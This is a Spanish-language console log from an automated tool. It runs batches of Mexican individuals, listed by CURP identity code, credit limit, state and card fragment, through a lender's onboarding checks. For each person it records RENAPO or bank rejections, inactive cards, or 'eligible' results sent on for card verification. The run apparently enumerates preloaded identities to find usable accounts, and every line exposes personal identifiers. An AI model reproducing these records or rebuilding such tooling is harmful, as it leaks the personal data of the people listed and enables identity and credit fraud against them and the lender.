[1474] ID:543185 | CAMF750830HDFSRR08 | $185,000 | CIUDAD DE ME | T:7445... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.3s)
[1475] ID:545675 | JURF701102MDFRMB01 | $185,000 | CIUDAD DE ME | T:0727... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5721 para ID:509121 ($185,000)... [🔴 OFF] Rechazo bancario (PE150) (13.3s)
[1476] ID:754180 | GAMM691107HNLRDR04 | $185,000 | NUEVO LEON | T:6983... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (11.5s)
[1477] ID:1009905 | GAHL730329MGTRRR00 | $185,000 | GUANAJUATO | T:7993... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.1s)
[1478] ID:1021665 | CORF751019HDFRDR07 | $185,000 | CIUDAD DE ME | T:3641... [🔴 OFF] Rechazo bancario (PE110) (13.4s)
[1479] ID:1092492 | RUSV690422MMCZNC02 | $185,000 | ESTADO DE ME | T:9913... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.8s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.5s)
[1480] ID:1108928 | VAVX731210HNLLLN00 | $185,000 | NUEVO LEON | T:2167... [1481] ID:1549263 | ZAMG730731HMCRRR09 | $185,000 | ESTADO DE ME | T:2121... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9913 para ID:1092492 ($185,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1482] ID:1605873 | VARE691226HJCLYS04 | $185,000 | JALISCO | T:5997... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[1483] ID:2176194 | VACG721124HDFLRL02 | $185,000 | CIUDAD DE ME | T:5661... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.1s)
[1484] ID:2392886 | GUPE690908MJCTZS05 | $185,000 | JALISCO | T:6974... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1485] ID:2599366 | FOGE770625HSPLRN08 | $185,000 | SAN LUIS POT | T:9447... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1486] ID:2898907 | CAFR750830HDFSRR05 | $185,000 | CIUDAD DE ME | T:9355... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.9s)
[1487] ID:2972979 | LOGR810606HCHPRN03 | $185,000 | CHIHUAHUA | T:3567... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (17.2s)

[+] Lote de 500 candidatos precargados con límite >= $50,000 (1969+)
[1488] ID:3129056 | FAMS730414HBCRDL06 | $185,000 | BAJA CALIFOR | T:8458... [1489] ID:3345942 | ROGJ700211HSOMRL07 | $185,000 | SONORA | T:3792... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1490] ID:3393992 | VADA740518HMCZLL00 | $185,000 | ESTADO DE ME | T:8279... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1491] ID:3396363 | WOCA720907HDFLNL06 | $185,000 | CIUDAD DE ME | T:4269... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.2s)
[1492] ID:3476900 | MOTA721218HDFRRL07 | $185,000 | CIUDAD DE ME | T:8387... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8458 para ID:3129056 ($185,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.2s)
[1493] ID:3772881 | GOTE710715HGTMMN09 | $185,000 | GUANAJUATO | T:5749... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[1494] ID:3863661 | MAAG701205HGTRGS08 | $185,000 | GUANAJUATO | T:5456... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[1495] ID:3873782 | CEHL691025HCSLNS03 | $185,000 | CHIAPAS | T:2367... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.3s)
[1496] ID:3887421 | AACR691230HVRLMG04 | $185,000 | VERACRUZ | T:1643... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.5s)
[1497] ID:4094030 | RAAH730101HDFNNG02 | $185,000 | CIUDAD DE ME | T:7486... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2367 para ID:3873782 ($185,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.3s)
[1498] ID:4460155 | QUMJ690926HHGRRR09 | $185,000 | HIDALGO | T:3779... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[1499] ID:4754132 | VEAL700708HTSLNN08 | $185,000 | TAMAULIPAS | T:8760... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)
[1500] ID:4792941 | TOAA760902MDFRLL08 | $185,000 | CIUDAD DE ME | T:4173... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7486 para ID:4094030 ($185,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[1501] ID:4801939 | REGF780205HJCYTL09 | $185,000 | JALISCO | T:0631... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (14.1s)
[1502] ID:2335148 | RICR770616MGTZHT03 | $184,980 | GUANAJUATO | T:0674... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1503] ID:4713087 | ZOME710319HSPRRD04 | $184,980 | SAN LUIS POT | T:3511... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[1504] ID:1343180 | RASA750913HNLMCL09 | $184,960 | NUEVO LEON | T:4555... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[1505] ID:275609 | AACJ700301MJCLVN00 | $184,930 | JALISCO | T:6329... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[1506] ID:205706 | NEGL720208MVRRRS02 | $184,880 | VERACRUZ | T:8198... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4555 para ID:1343180 ($184,960)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[1507] ID:2036662 | CUBE730310HMNDNR02 | $184,880 | MICHOACAN | T:6764... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.0s)
[1508] ID:2847068 | SAKJ800705HDFRMR00 | $184,870 | CIUDAD DE ME | T:0735... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.5s)
[1509] ID:2466716 | SAPJ710713HJCNRS07 | $184,860 | JALISCO | T:3019... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.4s)
[1510] ID:4369101 | CARM750818MDGMDR04 | $184,860 | DURANGO | T:5061... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[1511] ID:4370882 | DIAF770630HSOZVL00 | $184,810 | SONORA | T:2126... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3019 para ID:2466716 ($184,860)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1512] ID:10176 | GOCM730615HNLNSR09 | $184,800 | NUEVO LEON | T:2900... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (15.2s)
[1513] ID:230974 | BACC820511HGTLRR09 | $184,800 | GUANAJUATO | T:9602... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[1514] ID:2737555 | MAHF700526HMSRRL01 | $184,800 | MORELOS | T:0444... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2900 para ID:10176 ($184,800)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (16.7s)
[1515] ID:4349041 | CUAC730813HNLRYS05 | $184,800 | NUEVO LEON | T:7566... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[1516] ID:1391206 | GORE720127HNLNDR07 | $184,730 | NUEVO LEON | T:8210... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0444 para ID:2737555 ($184,800)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.1s)
[1517] ID:3635779 | LOGE740803HTSPLF07 | $184,730 | TAMAULIPAS | T:3467... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.2s)
[1518] ID:3877055 | RASA750313HNLMCL05 | $184,650 | NUEVO LEON | T:5059... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1519] ID:23196 | JILS710623HDFMSR00 | $184,640 | CIUDAD DE ME | T:6797... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.7s)
[1520] ID:2193990 | GORG720625MMCNDB02 | $184,630 | ESTADO DE ME | T:0728... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.2s)
[1521] ID:3423961 | ROMA790111MCHDRL02 | $184,630 | CHIHUAHUA | T:1465... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.7s)
[1522] ID:2378200 | TIVH711216HTSJLC03 | $184,620 | TAMAULIPAS | T:7757... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[1523] ID:2813947 | FAML840602HCHRLS02 | $184,600 | CHIHUAHUA | T:4976... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1465 para ID:3423961 ($184,630)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.9s)
[1524] ID:4675523 | OOMA710422HJCRNG09 | $184,570 | JALISCO | T:4571... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.5s)
[1525] ID:4133935 | MAMN691019HMCLLC06 | $184,520 | ESTADO DE ME | T:7866... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[1526] ID:42302 | EAMA720313HNLSZL07 | $184,500 | NUEVO LEON | T:7431... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.7s)
[1527] ID:3800277 | SASC690629HMCNGS08 | $184,500 | ESTADO DE ME | T:8457... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.5s)
[1528] ID:4111489 | CARV720829HVRDMC06 | $184,500 | VERACRUZ | T:8567... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.9s)
[1529] ID:4825013 | IAAF701223HCHCLR02 | $184,500 | CHIHUAHUA | T:6464... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1530] ID:4292449 | MOBE761112HMCRRR08 | $184,480 | ESTADO DE ME | T:6075... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[1531] ID:4015272 | ROAR690318HMCJLB01 | $184,460 | ESTADO DE ME | T:7976... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[1532] ID:3938255 | LOCL730829HJCSNS09 | $184,450 | JALISCO | T:1257... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6075 para ID:4292449 ($184,480)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[1533] ID:1769570 | GAAS711115HCSLLM09 | $184,390 | CHIAPAS | T:6571... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.9s)
[1534] ID:3291327 | RODM690628HDFZBR09 | $184,330 | CIUDAD DE ME | T:2837... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[1535] ID:662492 | FEMP720615HDFRRB03 | $184,300 | CIUDAD DE ME | T:5462... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.2s)
[1536] ID:891211 | GOGL690525HDFMMR06 | $184,270 | CIUDAD DE ME | T:5747... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5462 para ID:662492 ($184,300)... [1537] ID:1154816 | MEJG730610HTSDRS05 | $184,270 | TAMAULIPAS | T:0179... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[1538] ID:1306835 | MIMR720901HMCRRM04 | $184,260 | ESTADO DE ME | T:8363... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1539] ID:3684960 | VESE710105HVRLNM04 | $184,240 | VERACRUZ | T:3503... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[1540] ID:660827 | GOLB690804MDFNPL02 | $184,220 | CIUDAD DE ME | T:1506... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[1541] ID:857718 | GURM800328MNLJDN01 | $184,190 | NUEVO LEON | T:6055... [🔴 OFF] Rechazo bancario (PE1002) (18.9s)
[1542] ID:3789350 | ZEFH740427HCMPLR02 | $184,190 | COLIMA | T:9077... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[1543] ID:4887666 | CAMP740626HCMSRB00 | $184,180 | COLIMA | T:8904... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[1544] ID:173741 | TOPE730327HGTRRR02 | $184,150 | GUANAJUATO | T:3682... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1545] ID:4450134 | AEGL751113MNTLRZ06 | $184,150 | NAYARIT | T:8517... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[1546] ID:1046352 | BURR710915HDFSDC02 | $184,130 | CIUDAD DE ME | T:8005... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.3s)
[1547] ID:618667 | SAGS741209HTSNVL06 | $184,090 | TAMAULIPAS | T:7743... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8517 para ID:4450134 ($184,150)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[1548] ID:4047634 | AAGC790609HYCBFR00 | $184,090 | YUCATAN | T:5010... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.5s)
[1549] ID:2804634 | NUGF710602MNTNNV03 | $184,070 | NAYARIT | T:8897... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1550] ID:3797105 | CATH710905HJCRRC05 | $184,040 | JALISCO | T:5188... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8005 para ID:1046352 ($184,130)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[1551] ID:2652828 | RIAR710417HDFVRD04 | $184,030 | CIUDAD DE ME | T:3228... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.0s)
[1552] ID:3488113 | COGR761212HNLLZD04 | $184,030 | NUEVO LEON | T:0687... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[1553] ID:473815 | ROMH711023HASBNG09 | $184,000 | AGUASCALIENT | T:7840... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3228 para ID:2652828 ($184,030)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[1554] ID:538727 | CAMA691111HDFRNL07 | $184,000 | CIUDAD DE ME | T:1526... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.3s)
[1555] ID:837555 | PASR701204HCHRNF01 | $184,000 | CHIHUAHUA | T:4625... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1556] ID:904487 | MEGC700328HDFNDL00 | $184,000 | CIUDAD DE ME | T:5725... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.1s)
[1557] ID:1175419 | UIMC690930MBCRRL04 | $184,000 | BAJA CALIFOR | T:9316... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[1558] ID:1825139 | RACT741023MMCHRR02 | $184,000 | ESTADO DE ME | T:0795... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[1559] ID:1832837 | PAAL700329HNLDRS08 | $184,000 | NUEVO LEON | T:2469... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.3s)
[1560] ID:2104870 | AADM731214HMCBBR00 | $184,000 | ESTADO DE ME | T:7381... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[1561] ID:2325665 | FAPJ700428HDFLLV03 | $184,000 | CIUDAD DE ME | T:0893... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.3s)
[1562] ID:2325917 | SAGG690618HDFNZR03 | $184,000 | CIUDAD DE ME | T:5301... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.2s)
[1563] ID:2407619 | FAPJ700428HDFLLV03 | $184,000 | CIUDAD DE ME | T:6340... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0893 para ID:2325665 ($184,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.3s)
[1564] ID:2749829 | GOCM690909MPLNRR09 | $184,000 | PUEBLA | T:2860... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[1565] ID:2777768 | BEMJ710113HCMRRN05 | $184,000 | COLIMA | T:4396... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (17.1s)
[1566] ID:2802930 | GOEJ690721MGRMKZ07 | $184,000 | GUERRERO | T:1213... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6340 para ID:2407619 ($184,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1567] ID:3043377 | ZAFV750821HCGBLC01 | $184,000 | COAHUILA | T:6901... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[1568] ID:3170942 | NAVE740323HMCVLL05 | $184,000 | ESTADO DE ME | T:0658... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[1569] ID:3551192 | OAAE710530HNLNLD03 | $184,000 | NUEVO LEON | T:1832... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1570] ID:3935202 | ZACJ701112MTLRHN07 | $184,000 | TLAXCALA | T:7011... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.9s)
[1571] ID:4687137 | AOGR700310HTSCMM04 | $184,000 | TAMAULIPAS | T:6217... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1572] ID:4851465 | AAGC790609HYCBFR00 | $184,000 | YUCATAN | T:3766... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1573] ID:1035260 | PELD720213HDFRNR07 | $183,960 | CIUDAD DE ME | T:3788... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.0s)
[1574] ID:240703 | LASO691230MCHRTF01 | $183,940 | CHIHUAHUA | T:9386... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.6s)
[1575] ID:2726980 | EUVC711017MDFSLR03 | $183,920 | CIUDAD DE ME | T:1313... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[1576] ID:3576970 | BACL750518MNTTSR08 | $183,910 | NAYARIT | T:6638... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9386 para ID:240703 ($183,940)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.9s)
[1577] ID:4485367 | AURA690123HJCGZL08 | $183,880 | JALISCO | T:5313... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (12.9s)
[1578] ID:4171218 | CACC711126MDFNMR00 | $183,870 | CIUDAD DE ME | T:1548... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.3s)
[1579] ID:3828274 | MASI740802MDFRGR09 | $183,850 | CIUDAD DE ME | T:4513... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1313 para ID:2726980 ($183,920)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[1580] ID:734519 | TIFD690424MCSRNL09 | $183,830 | CHIAPAS | T:1992... [🔴 OFF] Contacto preexistente (/confirm-contact) (21.0s)
[1581] ID:231993 | VASF690401HCMRLR01 | $183,810 | COLIMA | T:2290... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[1582] ID:1230942 | VAFJ740119HVRLRS05 | $183,810 | VERACRUZ | T:6782... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1992 para ID:734519 ($183,830)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1583] ID:4525554 | MECC730724HMNLBS00 | $183,790 | MICHOACAN | T:7672... [🔴 OFF] Rechazo bancario (PE170) (13.8s)
[1584] ID:315577 | PEHG721129MGTRRB01 | $183,740 | GUANAJUATO | T:6533... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[1585] ID:4330728 | MATF720117HNLRRR02 | $183,700 | NUEVO LEON | T:1041... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7672 para ID:4525554 ($183,790)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.4s)
[1586] ID:4588704 | RACL730526HMSMHS04 | $183,700 | MORELOS | T:4145... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[1587] ID:2676980 | ZAML710202HDFMNS08 | $183,680 | CIUDAD DE ME | T:9693... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6533 para ID:315577 ($183,740)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[1588] ID:2803777 | VACY770603MMCRRZ03 | $183,680 | ESTADO DE ME | T:6657... [🔴 OFF] Rechazo bancario (PE1002) (21.3s)
[1589] ID:4374299 | DIMD730719HSOZRN08 | $183,630 | SONORA | T:7641... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[1590] ID:1970785 | HERL740925MQTRLR06 | $183,600 | QUERETARO | T:8123... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[1591] ID:3534101 | RAFM690922MPLMRN03 | $183,600 | PUEBLA | T:5257... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.1s)
[1592] ID:4793377 | HUAJ741202MCSSLN08 | $183,600 | CHIAPAS | T:0867... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8123 para ID:1970785 ($183,600)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[1593] ID:2495995 | HAMC730804HJCRRR04 | $183,590 | JALISCO | T:5084... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[1594] ID:3327683 | ROAC700116HVRMLP08 | $183,580 | VERACRUZ | T:6437... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.0s)
[1595] ID:3912910 | SIPL700511HBSLTS00 | $183,580 | BAJA CALIFOR | T:9354... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.0s)
[1596] ID:4607988 | HESG700809HBCRTL07 | $183,580 | BAJA CALIFOR | T:2103... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.1s)
[1597] ID:4525870 | FASC750217HMCRNS07 | $183,530 | ESTADO DE ME | T:3140... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[1598] ID:673374 | GIGJ780123HMNLDV04 | $183,500 | MICHOACAN | T:6600... [🔴 OFF] Rechazo bancario (PE110) (14.5s)
[1599] ID:2080898 | RACR700510HMCMLF00 | $183,480 | ESTADO DE ME | T:7805... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.5s)
[1600] ID:2915022 | VEGI691006HMNLNG00 | $183,460 | MICHOACAN | T:7772... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.3s)
[1601] ID:822807 | GUCM720421HMCDLN06 | $183,450 | ESTADO DE ME | T:1378... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.3s)
[1602] ID:3721002 | PEMR760719HJCRRM09 | $183,420 | JALISCO | T:7910... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[1603] ID:4566528 | PICA740924MGRNTL05 | $183,370 | GUERRERO | T:7221... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1604] ID:127155 | ROOA730101HQTSTR00 | $183,340 | QUERETARO | T:5959... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[1605] ID:2917096 | MAVF690602HDFRLR07 | $183,320 | CIUDAD DE ME | T:9835... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.4s)
[1606] ID:3709902 | COCA710130HVRNNL07 | $183,300 | VERACRUZ | T:8713... [🔴 OFF] Rechazo bancario (PE150) (13.8s)
[1607] ID:2923086 | NALJ741114HNLVDN02 | $183,200 | NUEVO LEON | T:4116... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1608] ID:1510640 | PERM740624HDFNSN07 | $183,180 | CIUDAD DE ME | T:6325... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[1609] ID:2755359 | CAGC691224MCGLRR00 | $183,130 | COAHUILA | T:2714... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[1610] ID:968709 | QUGM720927HCGNRN03 | $183,120 | COAHUILA | T:1780... [🔴 OFF] Rechazo bancario (PE170) (13.2s)
[1611] ID:3832044 | JAMA730908HMNRDL05 | $183,110 | MICHOACAN | T:6394... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1612] ID:172450 | TOCE770112HGTMZM07 | $183,100 | GUANAJUATO | T:9231... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.8s)
[1613] ID:169697 | YAOL690514MJCNLR09 | $183,070 | JALISCO | T:8977... [🔴 OFF] Rechazo bancario (PE170) (14.7s)
[1614] ID:1776639 | VARR760412HVRZYS03 | $183,070 | VERACRUZ | T:4839... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[1615] ID:228044 | CALJ701017HMCBPN00 | $183,040 | ESTADO DE ME | T:7669... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.6s)
[1616] ID:2610416 | VARJ000101HNLLGMA3 | $183,010 | NUEVO LEON | T:5750... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[1617] ID:426821 | SOOA710725MDFLLD05 | $183,000 | CIUDAD DE ME | T:1568... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[1618] ID:452847 | WACR730513HJCNRL04 | $183,000 | JALISCO | T:0329... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[1619] ID:527786 | GARA750121HMSRML06 | $183,000 | MORELOS | T:2725... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.9s)
[1620] ID:542871 | ROMC710717HCGJYR03 | $183,000 | COAHUILA | T:0139... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[1621] ID:564422 | LUSM710102HTSCNR05 | $183,000 | TAMAULIPAS | T:1883... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.4s)
[1622] ID:571905 | FEOJ770110HJCRRS07 | $183,000 | JALISCO | T:1244... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[1623] ID:860574 | CODH721013HMNRRG05 | $183,000 | MICHOACAN | T:0529... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1244 para ID:571905 ($183,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.2s)
